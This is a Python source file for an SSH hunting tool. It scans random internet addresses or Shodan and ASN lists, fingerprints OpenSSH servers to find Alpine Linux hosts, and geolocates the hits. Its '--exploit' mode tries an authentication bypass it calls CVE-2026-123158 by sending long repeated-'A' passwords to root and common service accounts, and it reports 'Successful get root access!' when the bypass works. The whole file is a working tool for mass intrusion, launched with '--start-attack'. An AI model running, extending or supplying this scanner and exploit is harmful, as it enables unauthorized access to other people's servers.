#!/usr/bin/env python3
from __future__ import annotations

import argparse
import asyncio
import bisect
import gzip
import hashlib
import ipaddress
import itertools
import json
import os
import random
import re
import resource
import socket
import ssl
import struct
import subprocess
import sys
import time
import urllib.parse
import urllib.request

__version__ = "3.4"
IDENT = b"SSH-2.0-AlpineHunt_" + __version__.encode() + b"\r\n"
MAX_BANNER = 1024
DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hassh_alpine.txt")
STATE_PATH = "alpine_hunt.state"
SEEN_CAP = 1200000

W_BANNER_ALPINE = 110
W_HASSH_DB = 70
W_WEB_ALPINE_TEXT = 55
W_WEB_APACHE_UNIX = 35
W_WEB_LIGHTTPD = 18
W_WEB_NGINX = 12
W_BUILD_MUSL_ISH = 22
W_OPENSSH = 8
C_GREEN = "\033[92m"
C_RED = "\033[91m"
C_DIM = "\033[2m"
C_OFF = "\033[0m"
VULN_FIXED = (10, 6, 2)
SSHHOLE_PW = "A" * 300

SSH_PORTS = frozenset({22, 222, 2200, 2022, 8022, 22022, 22222, 2222, 32022})
DISTRO_TAGS = ("debian", "ubuntu", "raspbian", "fedora", "centos", "rhel",
               "red hat", "suse", "arch", "freebsd", "openbsd", "amzn", "gentoo")
WEB_PORTS = (80, 8080, 8000, 8888, 443, 8443)

TOP_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 465, 587, 631,
    993, 995, 1080, 1433, 1521, 1723, 1883, 2049, 2082, 2083, 2086, 2087,
    2095, 2096, 2181, 2200, 2222, 2375, 2376, 3000, 3306, 3389, 3690, 4000,
    4369, 4443, 5000, 5432, 5555, 5601, 5672, 5900, 5984, 6000, 6379, 6443,
    7000, 7001, 7077, 8000, 8001, 8008, 8022, 8080, 8081, 8082, 8086, 8088,
    8090, 8161, 8443, 8888, 9000, 9001, 9042, 9090, 9092, 9200, 9300, 9418,
    9999, 10000, 10250, 11211, 15672, 20220, 22022, 22222, 27017, 27018,
    28017, 50000, 50070, 61616,
]

BOGONS = (
    "0.0.0.0/8", "10.0.0.0/8", "100.64.0.0/10", "127.0.0.0/8",
    "169.254.0.0/16", "172.16.0.0/12", "192.0.0.0/24", "192.0.2.0/24",
    "192.88.99.0/24", "192.168.0.0/16", "198.18.0.0/15", "198.51.100.0/24",
    "203.0.113.0/24", "224.0.0.0/4", "240.0.0.0/4",
)


def log(msg):
    print(msg, file=sys.stderr, flush=True)


def bump_fds(want=65535):
    try:
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = want if hard == resource.RLIM_INFINITY else min(want, hard)
        if soft < target:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
        return resource.getrlimit(resource.RLIMIT_NOFILE)[0]
    except Exception:
        try:
            return resource.getrlimit(resource.RLIMIT_NOFILE)[0]
        except Exception:
            return -1


def build_pools():
    ranges = [(1, 0xFFFFFFFF)]
    for cidr in BOGONS:
        net = ipaddress.ip_network(cidr)
        lo, hi = int(net.network_address), int(net.broadcast_address)
        nxt = []
        for a, b in ranges:
            if hi < a or lo > b:
                nxt.append((a, b))
                continue
            if a < lo:
                nxt.append((a, lo - 1))
            if b > hi:
                nxt.append((hi + 1, b))
        ranges = nxt
    return ranges


POOL = build_pools()
CUM = list(itertools.accumulate(b - a + 1 for a, b in POOL))


def random_ip():
    r = random.randrange(CUM[-1])
    i = bisect.bisect_right(CUM, r)
    a, _ = POOL[i]
    x = a + r - (CUM[i - 1] if i else 0)
    return "%d.%d.%d.%d" % (x >> 24, (x >> 16) & 255, (x >> 8) & 255, x & 255)


def parse_ports(spec):
    if not spec or spec.strip() in ("top", "default"):
        return list(dict.fromkeys(TOP_PORTS))
    out = []
    for chunk in spec.split(","):
        chunk = chunk.strip()
        if not chunk:
            continue
        if "-" in chunk:
            a, b = chunk.split("-", 1)
            a, b = int(a), int(b)
            if a > b:
                a, b = b, a
            out.extend(range(max(1, a), min(65535, b) + 1))
        else:
            out.append(int(chunk))
    return list(dict.fromkeys(p for p in out if 0 < p < 65536))


async def read_packet(reader):
    hdr = await reader.readexactly(4)
    plen = struct.unpack(">I", hdr)[0]
    if plen < 5 or plen > 40000:
        raise ValueError("bad packet length")
    body = await reader.readexactly(plen)
    return body[1:plen - body[0]]


def parse_kexinit(payload):
    off = 17
    out = {}
    for key in ("kex", "shk", "enc_c2s", "enc_s2c", "mac_c2s", "mac_s2c",
                "comp_c2s", "comp_s2c"):
        n = struct.unpack(">I", payload[off:off + 4])[0]
        off += 4
        out[key] = payload[off:off + n].decode("latin-1")
        off += n
    return out


def hassh_of(kex):
    return hashlib.md5(("%s;%s;%s;%s" % (kex["kex"], kex["enc_s2c"],
                                         kex["mac_s2c"], kex["comp_s2c"])
                        ).encode()).hexdigest()


def fingerprint(kex):
    return hassh_of(kex) + ":" + hashlib.md5(kex["shk"].encode()).hexdigest()


async def read_banner(reader):
    total = 0
    while total < MAX_BANNER:
        line = await reader.readline()
        if not line:
            return ""
        total += len(line)
        if line.startswith(b"SSH-"):
            return line.strip().decode("latin-1", "replace")
    return ""


async def grab_kexinit(reader, writer):
    writer.write(IDENT)
    await writer.drain()
    for _ in range(8):
        pkt = await read_packet(reader)
        if pkt and pkt[0] == 20:
            return parse_kexinit(pkt)
    return None


async def dial(ip, port, timeout):
    return await asyncio.wait_for(
        asyncio.open_connection(ip, port, family=socket.AF_INET), timeout)


class RateLimiter:
    def __init__(self, pps):
        self.pps = pps or 0
        self.tokens = float(pps or 0)
        self.last = time.monotonic()
        self.lock = asyncio.Lock()

    async def take(self):
        if not self.pps:
            return
        async with self.lock:
            while True:
                now = time.monotonic()
                self.tokens = min(self.pps, self.tokens + (now - self.last) * self.pps)
                self.last = now
                if self.tokens >= 1:
                    self.tokens -= 1
                    return
                await asyncio.sleep((1 - self.tokens) / self.pps)


def download(url, timeout=60):
    req = urllib.request.Request(url, headers={"User-Agent": "alpine-hunt/" + __version__})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read()


def targets_from_asn(asns, cache="ip2asn-v4.tsv.gz", max_age=7 * 86400):
    if not os.path.exists(cache) or time.time() - os.path.getmtime(cache) > max_age:
        log("[*] downloading ip2asn table ...")
        try:
            with open(cache, "wb") as f:
                f.write(download("https://iptoasn.com/data/ip2asn-v4-u32.tsv.gz"))
        except Exception as e:
            log("[!] asn table download failed: %s" % e)
            if not os.path.exists(cache):
                return
    wanted = {a.strip().lstrip("ASas") for a in asns}
    with gzip.open(cache, "rt") as f:
        for row in f:
            parts = row.rstrip("\n").split("\t")
            if len(parts) < 3 or parts[2] not in wanted:
                continue
            for net in ipaddress.summarize_address_range(
                    ipaddress.IPv4Address(int(parts[0])),
                    ipaddress.IPv4Address(int(parts[1]))):
                yield str(net)


def targets_from_shodan(key, query, limit):
    got, page = 0, 1
    while got < limit:
        url = ("https://api.shodan.io/shodan/host/search?key=%s&query=%s&page=%d"
               % (key, urllib.parse.quote(query), page))
        try:
            payload = json.loads(download(url, timeout=45))
        except Exception as e:
            log("[!] shodan page %d failed: %s" % (page, e))
            return
        matches = payload.get("matches") or []
        if not matches:
            return
        for m in matches:
            yield m.get("ip_str")
            got += 1
            if got >= limit:
                return
        page += 1
        time.sleep(1.1)


def targets_from_files(paths):
    for path in paths:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                line = line.split()[0]
                if "/" in line:
                    net = ipaddress.ip_network(line, strict=False)
                    if net.num_addresses <= 2:
                        yield str(net.network_address)
                    else:
                        for ip in net.hosts():
                            yield str(ip)
                else:
                    yield str(ipaddress.ip_address(line))


async def web_probe(ip, timeout=4.0):
    score, reasons = 0, []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    for port in WEB_PORTS:
        tls = port in (443, 8443)
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port, ssl=ctx if tls else None,
                                        server_hostname=ip if tls else None,
                                        family=socket.AF_INET),
                timeout)
        except Exception:
            continue
        blob = b""
        try:
            writer.write(b"GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: alpine-hunt\r\n"
                         b"Connection: close\r\n\r\n" % ip.encode())
            await writer.drain()
            blob = await asyncio.wait_for(reader.read(4096), timeout)
        except Exception:
            pass
        finally:
            try:
                writer.close()
            except Exception:
                pass
        low = blob.lower()
        if b"alpine" in low:
            score += W_WEB_ALPINE_TEXT
            reasons.append("web:alpine")
        for line in low.split(b"\n")[:20]:
            if line.startswith(b"server:"):
                if b"(unix)" in line:
                    score += W_WEB_APACHE_UNIX
                    reasons.append("web:apache-unix")
                elif b"apache" in line:
                    score += W_WEB_NGINX
                    reasons.append("web:apache-bare")
                elif b"lighttpd" in line:
                    score += W_WEB_LIGHTTPD
                    reasons.append("web:lighttpd")
                elif b"nginx" in line:
                    score += W_WEB_NGINX
                    reasons.append("web:nginx")
                break
    return score, reasons


CPANEL_PORTS = (2082, 2083, 2086, 2087, 2095, 2096)


async def cpanel_probe(ip, timeout=2.5):
    open_count = 0

    async def one(port):
        nonlocal open_count
        writer = None
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port, family=socket.AF_INET), timeout)
            open_count += 1
        except Exception:
            pass
        finally:
            if writer is not None:
                try:
                    writer.close()
                except Exception:
                    pass

    await asyncio.gather(*(one(p) for p in CPANEL_PORTS))
    return open_count >= 2


def confirm_alpine(ip, port, user, password, keyfile, timeout=8):
    try:
        import paramiko
    except ImportError:
        return None
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(ip, port=port, username=user, password=password,
                  key_filename=keyfile, timeout=timeout, banner_timeout=timeout,
                  auth_timeout=timeout, look_for_keys=False, allow_agent=False)
        _, out, _ = c.exec_command(
            "cat /etc/alpine-release 2>/dev/null; grep -i '^ID=' /etc/os-release 2>/dev/null")
        return out.read().decode("utf-8", "replace")
    except Exception:
        return None
    finally:
        try:
            c.close()
        except Exception:
            pass


def is_alpine_text(text):
    if not text:
        return False
    if "id=alpine" in text.lower():
        return True
    for line in text.splitlines():
        line = line.strip()
        if line and line[0].isdigit() and "." in line:
            return True
    return False


def parse_openssh(banner):
    if not banner:
        return None
    m = re.search(r"OpenSSH_(\d+)\.(\d+)(?:p(\d+))?", banner)
    if not m:
        return None
    maj, mino = int(m.group(1)), int(m.group(2))
    pat = int(m.group(3)) if m.group(3) else 0
    return (maj, mino, pat, "%d.%d%s" % (maj, mino, "p%d" % pat if pat else ""))


def is_vuln(ver):
    return ver[:3] < VULN_FIXED


def sshhole_probe(ip, port, users, lengths, per_conn=3, timeout=8):
    out = {"password_allowed": None, "bypass": False, "user": None, "length": None}
    try:
        import paramiko
    except ImportError:
        return out
    primary = users[0] if users else "root"
    attempts = [(primary, n) for n in lengths]
    attempts += [(u, lengths[0]) for u in users[1:]]
    i = 0
    while i < len(attempts):
        chunk = attempts[i:i + per_conn]
        t = None
        try:
            t = paramiko.Transport((ip, port))
            t.start_client(timeout=timeout)
        except Exception:
            break
        try:
            for user, n in chunk:
                try:
                    t.auth_password(user, "A" * n)
                except paramiko.BadAuthenticationType:
                    out["password_allowed"] = False
                    return out
                except paramiko.AuthenticationException:
                    out["password_allowed"] = True
                    continue
                except Exception:
                    break
                out.update(bypass=True, user=user, length=n, password_allowed=True)
                return out
        finally:
            try:
                t.close()
            except Exception:
                pass
        i += per_conn
        time.sleep(0.3)
    return out


class Hunter:
    def __init__(self, cfg, hassh_db):
        self.cfg = cfg
        self.hassh_db = hassh_db
        self.hosts = asyncio.Queue(maxsize=max(2048, cfg.host_workers * 8))
        self.ports = asyncio.Queue(maxsize=max(8192, cfg.concurrency * 8))
        self.geo_q = asyncio.Queue()
        self.limiter = RateLimiter(cfg.rate)
        self.seen = set()
        self.done = set()
        self.hits = 0
        self.rejected = 0
        self.vulns = 0
        self.hosts_scanned = 0
        self.ports_scanned = 0
        self.open_ports = 0
        self.alive = 0
        self.started = time.monotonic()
        self.first_done = None
        self.color = sys.stdout.isatty() and not cfg.no_color
        self.out_lock = asyncio.Lock()
        self.stopping = False

    def paint(self, code, text):
        return code + text + C_OFF if self.color else text

    def report(self, ip, port, vuln):
        pr = vuln.get("probe") or {}
        user = pr.get("user") or self.cfg.cve_users[0]
        n = pr.get("length") or self.cfg.cve_lengths[0]
        pw = "A" * n
        shown = pw if len(pw) <= 96 else pw[:96] + "..."
        target = "ssh %s@%s%s" % (user, ip, "" if port == 22 else " -p %d" % port)
        for line in ("> Trying bypass....", "> " + target,
                     "> Password : %s (%d)" % (shown, n)):
            print(self.paint(C_DIM, line), flush=True)
        if pr.get("bypass"):
            if user == "root":
                print(self.paint(C_GREEN, "> Successful get root access!"), flush=True)
            else:
                print(self.paint(C_GREEN, "> Successful login as %s!" % user), flush=True)
        else:
            reason = {
                "no-password-auth": "password authentication unavailable",
                "AUTH_REJECTED": "authentication rejected",
                "unreachable": "connection or authentication status unknown"
            }.get(vuln["status"], "authentication not confirmed")
            print(self.paint(C_RED, "> Unsuccessful - " + reason), flush=True)

    def emit(self, line):
        print(line, flush=True)
        if self.cfg.output:
            with open(self.cfg.output, "a") as f:
                f.write(line + "\n")

    async def _progress(self):
        tick = 0
        while not self.stopping:
            tick += 1
            await asyncio.sleep(1 if tick <= 15 else 5)
            el = max(time.monotonic() - self.started, 0.001)
            log("[*] %d hosts (%.0f h/s) | %d ports | %d ssh | %d open | %d hits | q %d/%d"
                % (self.hosts_scanned, self.hosts_scanned / el, self.ports_scanned,
                   self.alive, self.open_ports, self.hits,
                   self.hosts.qsize(), self.ports.qsize()))

    async def _geo_worker(self):
        buf = []
        while True:
            try:
                buf.append(await asyncio.wait_for(self.geo_q.get(), timeout=1.5))
            except asyncio.TimeoutError:
                pass
            if buf and (len(buf) >= 100 or self.geo_q.empty()):
                batch, buf = buf, []
                await self._resolve(batch)

    @staticmethod
    def _ipapi(ips):
        body = json.dumps([{"query": ip, "fields": "status,country,countryCode,query"}
                           for ip in ips]).encode()
        req = urllib.request.Request(
            "http://ip-api.com/batch", data=body,
            headers={"Content-Type": "application/json",
                     "User-Agent": "alpine-hunt"})
        with urllib.request.urlopen(req, timeout=25) as r:
            data = json.loads(r.read())
        out = {}
        for row in data:
            if row.get("status") == "success":
                out[row["query"]] = "%s (%s)" % (row.get("country", "?"),
                                                 row.get("countryCode", "??"))
        return out

    async def _resolve(self, batch):
        countries = {}
        if not self.cfg.no_geo:
            for attempt in range(4):
                try:
                    countries = await asyncio.get_running_loop().run_in_executor(
                        None, self._ipapi, [ip for ip, *_ in batch])
                    break
                except Exception:
                    await asyncio.sleep(1.5 * (attempt + 1))
        for ip, port, reasons, vuln in batch:
            country = countries.get(ip, "Unknown") or "Unknown"
            if self.cfg.require_country:
                cc = country.rsplit("(", 1)[-1].rstrip(")") if "(" in country else ""
                if cc not in self.cfg.require_country:
                    continue
            async with self.out_lock:
                self.hits += 1
                self.emit("[FOUND - ALPINE SSH] - ssh://%s:%d - %s" % (ip, port, country))
                if self.cfg.json:
                    with open(self.cfg.json, "a") as f:
                        f.write(json.dumps({"ip": ip, "port": port, "country": country,
                                            "reasons": reasons,
                                            "ts": int(time.time())}) + "\n")
                if self.cfg.verbose:
                    log("    signals: %s" % ", ".join(reasons))
                if vuln:
                    self.vulns += 1
                    extra = (" " + vuln["detail"]) if vuln.get("detail") else ""
                    self.emit("[POTENTIAL CVE-2026-123158] - ssh://%s:%d - OpenSSH %s - %s%s"
                              % (ip, port, vuln["version"], vuln["status"], extra))
                    self.report(ip, port, vuln)

    async def gate(self, ip):
        found = []

        async def one(port):
            writer = None
            try:
                await self.limiter.take()
                _, writer = await dial(ip, port, self.cfg.gate_timeout)
                found.append(port)
            except Exception:
                pass
            finally:
                if writer is not None:
                    try:
                        writer.close()
                    except Exception:
                        pass

        await asyncio.gather(*(one(p) for p in self.cfg.gate_ports))
        return found

    async def score_host(self, ip, port):
        score, reasons, banner, kex = 0, [], "", None
        writer = None
        try:
            await self.limiter.take()
            reader, writer = await dial(ip, port, self.cfg.timeout)
            banner = await asyncio.wait_for(read_banner(reader), self.cfg.timeout)
            if not banner or "openssh" not in banner.lower():
                return 0, ["not-openssh"], banner, None
            low = banner.lower()
            if "alpine" in low:
                score += W_BANNER_ALPINE
                reasons.append("banner:alpine")
            elif not self.cfg.allow_tagged:
                tag = next((t for t in DISTRO_TAGS if t in low), None)
                if tag:
                    return 0, ["distro:" + tag], banner, None
            score += W_OPENSSH
            kex = await asyncio.wait_for(grab_kexinit(reader, writer), self.cfg.timeout)
            if kex:
                h = fingerprint(kex)
                if h in self.hassh_db:
                    score += W_HASSH_DB
                    reasons.append("hassh:" + h[:12])
                if "ssh-rsa" in kex["shk"] and "ssh-ed25519" in kex["shk"]:
                    score += W_BUILD_MUSL_ISH // 2
                    reasons.append("build:rsa+ed25519")
                if "diffie-hellman-group14-sha1" not in kex["kex"]:
                    score += W_BUILD_MUSL_ISH // 2
                    reasons.append("build:lean-kex")
        except asyncio.TimeoutError:
            return score, reasons + ["timeout"], banner, kex
        except Exception:
            return score, reasons + ["failed"], banner, kex
        finally:
            if writer is not None:
                try:
                    writer.close()
                except Exception:
                    pass
        return score, reasons, banner, kex

    async def verify_alpine(self, ip, port):
        score, reasons, banner, _ = await self.score_host(ip, port)
        if score == 0:
            return
        if self.cfg.web_probe and score < self.cfg.min_score:
            try:
                ws, wr = await web_probe(ip)
                score += ws
                reasons.extend(wr)
            except Exception:
                pass
        if not self.cfg.allow_tagged:
            try:
                if await cpanel_probe(ip):
                    self.rejected += 1
                    if self.cfg.show_rejects:
                        log("[ ] %s:%d cpanel host" % (ip, port))
                    return
            except Exception:
                pass
            matched = any(r.startswith("hassh:") for r in reasons)
            if not matched and "banner:alpine" not in reasons:
                if self.cfg.show_rejects:
                    log("[ ] %s:%d no fingerprint match (%s)" % (ip, port, ",".join(reasons)))
                return
        if score < self.cfg.min_score:
            if self.cfg.show_rejects:
                log("[ ] %s:%d score=%d (%s)" % (ip, port, score, ",".join(reasons)))
            return
        if self.cfg.exploit:
            vscore, vbanner = score, banner
        else:
            vscore, vreasons, vbanner, _ = await self.score_host(ip, port)
        if self.cfg.user:
            text = await asyncio.get_running_loop().run_in_executor(
                None, confirm_alpine, ip, port, self.cfg.user,
                self.cfg.password, self.cfg.key)
            if not is_alpine_text(text):
                self.rejected += 1
                if self.cfg.show_rejects:
                    log("[ ] %s:%d verify: not alpine" % (ip, port))
                return
            reasons.append("confirmed")
        else:
            if vscore < self.cfg.min_score:
                self.rejected += 1
                if self.cfg.show_rejects:
                    log("[ ] %s:%d verify: score %d" % (ip, port, vscore))
                return
            reasons.append("verified:%d" % vscore)
        vuln = None
        detail = ""
        pr = None
        ver = parse_openssh(vbanner)
        if self.cfg.cve and ver and is_vuln(ver):
            status = "version-only"
            if self.cfg.exploit:
                pr = await asyncio.get_running_loop().run_in_executor(
                    None, sshhole_probe, ip, port,
                    self.cfg.cve_users, self.cfg.cve_lengths)
                if pr.get("bypass"):
                    status = "EXPLOITED"
                    detail = "%s/%d" % (pr["user"], pr["length"])
                elif pr.get("password_allowed") is False:
                    status = "no-password-auth"
                elif pr.get("password_allowed"):
                    status = "AUTH_REJECTED"
                else:
                    status = "unreachable"
            if status == "no-password-auth" and not self.cfg.show_keyonly:
                self.rejected += 1
                return
            vuln = {"version": ver[3], "status": status, "detail": detail, "probe": pr}
            if self.cfg.verbose:
                log("    cve: %s %s" % (ver[3], status))
        await self.geo_q.put((ip, port, reasons, vuln))

    async def host_worker(self):
        while True:
            ip = await self.hosts.get()
            if ip is None:
                self.hosts.task_done()
                return
            try:
                if self.cfg.gate:
                    alive = await self.gate(ip)
                    if not alive:
                        continue
                    self.alive += 1
                    if self.cfg.verbose:
                        log("[+] %s ssh open on %s" % (ip, alive))
                    for port in alive:
                        await self.ports.put((ip, port))
                    if self.cfg.portscan:
                        for port in self.cfg.port_list:
                            if port not in alive:
                                await self.ports.put((ip, port))
                else:
                    for port in self.cfg.port_list:
                        await self.ports.put((ip, port))
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            finally:
                self.hosts_scanned += 1
                if self.first_done is None:
                    self.first_done = time.monotonic() - self.started
                    log("[*] pipeline live, first host handled in %.2fs" % self.first_done)
                if self.cfg.state:
                    self.done.add(ip)
                self.hosts.task_done()

    async def port_worker(self):
        while True:
            item = await self.ports.get()
            if item is None:
                self.ports.task_done()
                return
            ip, port = item
            writer = None
            try:
                await self.limiter.take()
                _, writer = await dial(ip, port, self.cfg.timeout)
                self.open_ports += 1
                if self.cfg.show_open:
                    log("[OPEN] %s:%d" % (ip, port))
            except Exception:
                continue
            finally:
                if writer is not None:
                    try:
                        writer.close()
                    except Exception:
                        pass
                self.ports_scanned += 1
                self.ports.task_done()
            if port in SSH_PORTS and self.cfg.verify:
                try:
                    await self.verify_alpine(ip, port)
                except Exception:
                    pass

    async def feed(self, targets):
        count = 0
        for ip in targets:
            if ip in self.done:
                continue
            if ip in self.seen:
                continue
            if len(self.seen) > SEEN_CAP:
                self.seen.clear()
            self.seen.add(ip)
            await self.hosts.put(ip)
            count += 1
            if self.cfg.max_hosts and count >= self.cfg.max_hosts:
                break
        log("[*] %d hosts queued" % count)

    async def run(self, targets):
        if self.cfg.state and os.path.exists(self.cfg.state):
            with open(self.cfg.state) as f:
                self.done = {l.strip() for l in f if l.strip()}
            log("[*] resuming, %d hosts already scanned" % len(self.done))
        tasks = [asyncio.create_task(self._geo_worker()),
                 asyncio.create_task(self._progress())]
        hw = [asyncio.create_task(self.host_worker()) for _ in range(self.cfg.host_workers)]
        pw = [asyncio.create_task(self.port_worker()) for _ in range(self.cfg.concurrency)]
        try:
            await self.feed(targets)
            await self.hosts.join()
            for _ in hw:
                await self.hosts.put(None)
            await asyncio.gather(*hw, return_exceptions=True)
            await self.ports.join()
            for _ in pw:
                await self.ports.put(None)
            await asyncio.gather(*pw, return_exceptions=True)
        except (KeyboardInterrupt, asyncio.CancelledError):
            log("\n[!] interrupted, draining ...")
        finally:
            self.stopping = True
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(1)
            if self.cfg.state:
                with open(self.cfg.state, "w") as f:
                    f.write("\n".join(sorted(self.done)))

    def summary(self):
        el = max(time.monotonic() - self.started, 0.001)
        log("\n[*] %d hosts in %.1fs (%.0f h/s) | %d ports | %d ssh | %d open | %d hits | %d vuln"
            % (self.hosts_scanned, el, self.hosts_scanned / el,
               self.ports_scanned, self.alive, self.open_ports, self.hits, self.vulns))


async def learn(target, note):
    if target.startswith("ssh://"):
        target = target[6:]
    host, _, port = target.partition(":")
    port = int(port or 22)
    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(host, port, family=socket.AF_INET), 8)
    try:
        banner = await asyncio.wait_for(read_banner(reader), 8)
        kex = await asyncio.wait_for(grab_kexinit(reader, writer), 8)
    finally:
        writer.close()
    if not kex:
        log("[!] no KEXINIT received")
        return
    h = fingerprint(kex)
    print(json.dumps({"banner": banner, "hassh": h, "note": note, "kex": kex}, indent=2))
    with open(DB_PATH, "a") as f:
        f.write("%s\t%s\n" % (h, note or banner))
    log("[+] %s added to %s" % (h, DB_PATH))


async def run_test(target, cfg):
    host, _, port = target.partition(":")
    port = int(port or 22)
    cfg.timeout = max(cfg.timeout, 6.0)
    h = Hunter(cfg, load_db())
    score, reasons, banner, kex = await h.score_host(host, port)
    print("banner : %s" % (banner or "-"))
    if kex:
        print("hassh  : %s" % hassh_of(kex))
        print("shk    : %s" % kex["shk"])
    ws, wr = await web_probe(host)
    print("web    : %d %s" % (ws, ",".join(wr) or "-"))
    print("cpanel : %s" % await cpanel_probe(host))
    print("score  : %d / %d (%s)" % (score + ws, cfg.min_score, ",".join(reasons + wr) or "-"))


SEED_IMAGES = ("alpine:3.13", "alpine:3.14", "alpine:3.15", "alpine:3.16",
               "alpine:3.17", "alpine:3.18", "alpine:3.19", "alpine:3.20",
               "alpine:3.21", "alpine:edge")


def seed_docker():
    ok = 0
    for img in SEED_IMAGES:
        name = "alpine-seed-%d" % random.randrange(1 << 30)
        try:
            subprocess.run(
                ["docker", "run", "-d", "--name", name, img, "sh", "-c",
                 "apk add --no-cache openssh && mkdir -p /run/sshd && "
                 "ssh-keygen -A && /usr/sbin/sshd -D -e -p 2222"],
                check=True, capture_output=True)
            time.sleep(4.0)
            ip = subprocess.check_output(
                ["docker", "inspect", "-f",
                 "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", name]
            ).decode().strip()
            if not ip:
                log("[!] %s: no container ip" % img)
                continue
            asyncio.run(learn("ssh://%s:2222" % ip, "seed/" + img))
            ok += 1
        except Exception as e:
            log("[!] %s failed: %s" % (img, e))
        finally:
            subprocess.run(["docker", "rm", "-f", name], capture_output=True)
    log("[*] seeded %d fingerprints into %s" % (ok, DB_PATH))


def load_db():
    db = set()
    if os.path.exists(DB_PATH):
        with open(DB_PATH) as f:
            for line in f:
                line = line.split("#")[0].strip()
                if line:
                    db.add(line.split()[0])
    return db


def build_parser():
    p = argparse.ArgumentParser(
        description="Alpine SSH hunter: host discovery, port scan, verification.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    p.add_argument("--start-attack", action="store_true")
    p.add_argument("--all", action="store_true")
    p.add_argument("--verify", action="store_true")
    p.add_argument("--cve", action="store_true")
    p.add_argument("--exploit", action="store_true")
    p.add_argument("--cve-user", default="root")
    p.add_argument("--cve-users",
                   default="nobody,daemon,bin,sys,sshd,chrony,ntp,ftp,guest,admin,test")
    p.add_argument("--cve-lengths", default="257,300,512,1024")
    p.add_argument("--show-keyonly", action="store_true")
    p.add_argument("--no-color", action="store_true")
    p.add_argument("--portscan", action="store_true")
    p.add_argument("--no-gate", dest="gate", action="store_false")
    p.add_argument("--allow-tagged", action="store_true")
    p.add_argument("--test", metavar="HOST[:PORT]")
    p.add_argument("--targets", nargs="+", metavar="FILE")
    p.add_argument("--asn")
    p.add_argument("--shodan", metavar="KEY")
    p.add_argument("--shodan-query", default="port:22")
    p.add_argument("--shodan-limit", type=int, default=5000)
    p.add_argument("--ports", default="top")
    p.add_argument("--gate-ports", default="22,2222")
    p.add_argument("--concurrency", type=int, default=800)
    p.add_argument("--host-workers", type=int, default=600)
    p.add_argument("--gate-timeout", type=float, default=1.2)
    p.add_argument("--timeout", type=float, default=3.0)
    p.add_argument("--rate", type=int, default=0)
    p.add_argument("--min-score", type=int, default=45)
    p.add_argument("--max-hosts", type=int, default=0)
    p.add_argument("--output", "-o")
    p.add_argument("--json")
    p.add_argument("--state", default=None)
    p.add_argument("--user")
    p.add_argument("--password")
    p.add_argument("--key")
    p.add_argument("--require-country", nargs="+", metavar="CC")
    p.add_argument("--no-web-probe", dest="web_probe", action="store_false")
    p.add_argument("--no-geo", action="store_true")
    p.add_argument("--show-open", action="store_true")
    p.add_argument("--show-rejects", action="store_true")
    p.add_argument("--verbose", "-v", action="store_true")
    p.add_argument("--seed", action="store_true")
    p.add_argument("--learn", metavar="ssh://HOST:PORT")
    p.add_argument("--note")
    return p


def main():
    cfg = build_parser().parse_args()

    if cfg.learn:
        asyncio.run(learn(cfg.learn, cfg.note))
        return

    if cfg.seed:
        seed_docker()
        return

    if cfg.test:
        asyncio.run(run_test(cfg.test, cfg))
        return

    if cfg.exploit:
        cfg.cve = True

    if not cfg.start_attack:
        print("usage: python3 alpine.py --start-attack --all --verify")
        print("       python3 alpine.py --start-attack --all --portscan --verify")
        print("       python3 alpine.py --test github.com:22")
        return

    if not (cfg.all or cfg.targets or cfg.asn or cfg.shodan):
        log("[!] pick --all, --targets, --asn or --shodan")
        sys.exit(2)

    if cfg.state is None and not cfg.all:
        cfg.state = STATE_PATH

    fd = bump_fds()
    need = cfg.concurrency + cfg.host_workers * len(cfg.gate_ports.split(",")) + 64
    log("[*] fd limit %s, need ~%d" % (fd if fd > 0 else "?", need))
    if fd > 0 and fd < need:
        log("[!] fd limit too low, reduce --concurrency/--host-workers")

    cfg.cve_users = [cfg.cve_user] + [u.strip() for u in cfg.cve_users.split(",") if u.strip()]
    cfg.cve_lengths = [int(n) for n in cfg.cve_lengths.split(",") if n.strip()]
    cfg.port_list = parse_ports(cfg.ports)
    cfg.gate_ports = [int(x) for x in cfg.gate_ports.split(",") if x.strip()]
    log("[*] gate ports %s, %d scan ports, concurrency %d/%d"
        % (cfg.gate_ports, len(cfg.port_list), cfg.concurrency, cfg.host_workers))

    def endless_random():
        while True:
            yield random_ip()

    def from_lists():
        if cfg.targets:
            yield from targets_from_files(cfg.targets)
        if cfg.asn:
            for cidr in targets_from_asn(cfg.asn.split(",")):
                net = ipaddress.ip_network(cidr)
                if net.num_addresses <= 2:
                    yield str(net.network_address)
                else:
                    for ip in net.hosts():
                        yield str(ip)
        if cfg.shodan:
            yield from targets_from_shodan(cfg.shodan, cfg.shodan_query, cfg.shodan_limit)

    def combined():
        yield from from_lists()
        if cfg.all:
            yield from endless_random()

    db = load_db()
    log("[*] alpine_hunt %s | %d fingerprints | min-score %d"
        % (__version__, len(db), cfg.min_score))
    if not db:
        log("[!] fingerprint DB empty - seed with --learn or Alpine hosts will be missed")
    hunter = Hunter(cfg, db)
    try:
        asyncio.run(hunter.run(combined()))
    except KeyboardInterrupt:
        pass
    hunter.summary()


if __name__ == "__main__":
    main()
